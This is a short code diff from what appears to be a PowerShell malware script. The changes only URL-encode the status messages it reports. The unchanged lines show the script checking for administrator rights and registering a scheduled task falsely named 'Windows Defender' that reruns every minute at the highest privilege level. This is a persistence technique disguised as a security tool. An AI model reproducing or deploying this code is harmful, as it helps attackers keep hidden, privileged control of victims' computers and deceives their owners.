@@ -7,7 +7,7 @@ Remove-Item -Path $filename -Force;
 
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
 if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $false){
-	$message = "%E2%9C%96%EF%B8%8F Need Administrator Privileges";
+	$message = "%E2%9C%96%EF%B8%8F%20Need%20Administrator%20Privileges";
 }
 else{
     try{
@@ -16,7 +16,7 @@ else{
         $Time = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1);
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries;
         Register-ScheduledTask -TaskName 'Windows Defender' -Trigger $Time -User ($env:COMPUTERNAME + '\' + $env:USERNAME) -Action $Action -Settings $Settings -RunLevel Highest;
-        $message = "%E2%9C%94%EF%B8%8F Scheduled Task created successfully";
+        $message = "%E2%9C%94%EF%B8%8F%20Scheduled%20Task%20created%20successfully";
         }
     catch{
         $message = "%E2%9C%96%EF%B8%8F Failed To Create A Scheduled Task";
